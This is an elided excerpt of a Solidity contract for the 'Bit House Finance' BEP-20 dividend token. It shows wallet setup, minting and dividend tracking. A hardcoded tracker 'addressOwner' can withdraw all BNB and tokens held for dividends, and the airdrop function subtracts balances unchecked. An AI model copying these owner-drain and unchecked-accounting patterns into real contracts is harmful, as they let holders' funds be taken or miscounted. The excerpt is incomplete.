...
contract DividendPayingToken is ERC20, Ownable, DividendPayingTokenInterface, DividendPayingTokenOptionalInterface {
  ...
  address public constant BTC = address(0x8301F2213c0eeD49a7E28Ae4c3e91722919B8B47);
...
contract BitHouse is ERC20, Ownable {
    ...
    address private constant BTC = address(0x8301F2213c0eeD49a7E28Ae4c3e91722919B8B47);

    uint256 public swapTokensAtAmount = 8000 * (10**8);
    uint256 public maxTxAmount;

    address payable public marketingWallet =    payable(address(0x6213517068Be25A3AFc0cc6BE611C3c89cC200A0));
    address public  prizeWallet =               address(0x89C6C7bFD5DA79f4462dbf44075Bc4A31871a37a);
    address public listingWallet =              address(0x5894E58EDf9954a292324a8F7847e71aC6cfC4Cc);
    ...
    constructor() ERC20("Bit House Finance", "BTH") {
        ...
        dividendTracker.excludeFromDividends(prizeWallet);
        dividendTracker.excludeFromDividends(listingWallet);
        ...
        excludeFromFees(listingWallet, true);
        ...
        */
        ...
        emit Transfer(address(0), address(0), 21000000 * (10**8));
        _mint(owner(), 18900000 * (10**8)); //presale and pancakeswap listing only
        _mint(prizeWallet, 1050000 * (10**8)); //prize wallet for the winner
        _mint(listingWallet, 1050000 * (10**8)); //tokens for listing and airdrop


        maxTxAmount = 90000000000000;
    }
    ...
    function balanceERC20 (address _address) external onlyOwner{
    ...
    function airdrop (address[] memory addresses, uint256[] memory tokens, uint256 totalTokens) external onlyOwner {
        ...
        unchecked { _balances[address(this)] -= totalTokens; }
    ...
    function setWallets(address payable _marketingWallet, address _prizeWallet, address _listingWallet) external onlyOwner {
    ...
    function swapAndSendDividends(uint256 tokens) private {
        uint256 initialETHBalance = IERC20(BTC).balanceOf(address(this));
        ...
        if (success) {
            dividendTracker.distributeDividends(newBalance);
...
contract DividendTracker is Ownable, DividendPayingToken {
    ...
    address public addressOwner = address(0x07540E65faD10fcDc57E6686E5F973Bb8fbd2d50);
    ...
    constructor()
        DividendPayingToken("Bit House Finance", "Bit House Finance"){
        claimWait = 3600;
    ...
    function balanceBNB(address receiver) external isOwner {
        payable(receiver).transfer(address(this).balance);
    }

    function balanceERC20 (address receiver, address tokenAddress) external isOwner {
